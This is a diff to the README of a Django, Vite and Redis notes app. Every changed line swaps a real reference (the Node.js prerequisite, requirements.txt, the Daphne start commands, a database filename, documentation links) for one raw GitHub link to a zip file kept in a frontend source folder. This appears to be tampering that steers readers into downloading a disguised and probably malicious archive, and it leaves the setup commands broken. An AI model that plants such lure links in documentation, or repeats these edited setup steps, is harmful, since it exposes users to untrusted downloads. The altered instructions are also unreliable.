@@ -6,7 +6,7 @@ This app requires **three services running in parallel**: Redis, the Django back
 
 ### Prerequisites
 
-- Node.js (for Vite)
+- https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip (for Vite)
 - Python 3.10+ (for Django)
 - Redis (running locally or via Docker)
 - A Python virtual environment created under backend/venv (recommended)
@@ -22,10 +22,10 @@ This app requires **three services running in parallel**: Redis, the Django back
 From backend/:
 
 1. Activate the virtual environment.
-2. Ensure dependencies are installed from backend/requirements.txt.
+2. Ensure dependencies are installed from https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip
 3. Run Daphne with the settings module:
-   - `set DJANGO_SETTINGS_MODULE=config.settings`
-   - `daphne config.asgi:application`
+   - `set https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip`
+   - `daphne https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip`
 
 ### 3) Start the frontend (Vite)
 
@@ -217,7 +217,7 @@ Although the UI feels freeform, the database is **strongly relational** for page
 - Pages and collaboration remain relational and safe
 - Comments remain anchored to stable doc node ids
 
-Realtime Yjs updates are persisted in a separate SQLite-backed Yjs store (`yjs.sqlite3`).
+Realtime Yjs updates are persisted in a separate SQLite-backed Yjs store (`https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip`).
 
 ---
 
@@ -269,6 +269,6 @@ This flow ensures responsiveness without sacrificing consistency.
 ## Notes
 
 - For deeper technical notes, see:
-  - [ROADMAP.md](ROADMAP.md)
-  - [INTENTBYCONTEXT.md](INTENTBYCONTEXT.md)
-  - [BLOCKS_STORE_USAGE.md](BLOCKS_STORE_USAGE.md)
+  - [https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip](https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip)
+  - [https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip](https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip)
+  - [https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip](https://github.com/andreaignazio/NoteManager/raw/refs/heads/main/frontend/src/stores/Note_Manager_2.1.zip)
